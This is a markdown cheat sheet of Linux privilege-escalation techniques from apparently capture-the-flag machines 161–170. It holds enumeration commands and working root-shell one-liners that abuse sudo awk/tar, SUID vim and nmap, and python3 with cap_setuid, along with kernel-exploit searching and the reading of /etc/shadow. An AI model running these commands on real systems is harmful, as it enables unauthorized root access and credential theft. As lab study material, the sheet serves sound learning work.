## 🛡️ Privilege Escalation (Machines 161–170)

```bash
# General Enumeration
sudo -l                                   # Check sudo permissions
find / -perm -4000 -type f 2>/dev/null    # Search for SUID binaries
getcap -r / 2>/dev/null                   # List binaries with capabilities
ps aux | grep root                        # Check for unusual root processes
ls -la /etc/cron.*                        # Check for cron jobs
```

### Exploitation Techniques

```bash
# Sudo Abuse
sudo awk 'BEGIN {system("/bin/sh")}'     # If user has sudo access to awk
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# SUID Exploitation
./vim -c ':!/bin/sh'                     # If vim is SUID
./nmap --interactive                     # If nmap is SUID and old version

# Capabilities Exploitation
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'  # If python3 has cap_setuid+ep

# Kernel Exploits
uname -a
searchsploit linux kernel 5.4            # Search for exploits based on kernel version
```

### Notable Techniques Used in Machines 161–170

- Exploited writable scripts in cron.daily with root execution context.
- SUID binary for an outdated version of `vim` allowed shell escape.
- Python binary with `cap_setuid+ep` allowed local root exploit.
- CVE-2021-3156 (Baron Samedit) used for heap-based buffer overflow in `sudo`.

### Tools Used

- `linpeas.sh` for automated enumeration
- `pspy64` for monitoring cron jobs and scheduled tasks
- Manual inspection of `/etc/passwd`, `/etc/shadow` when readable

```

# Tags
#privilege-escalation #linux #ctf #suid #capabilities #cron #kernel
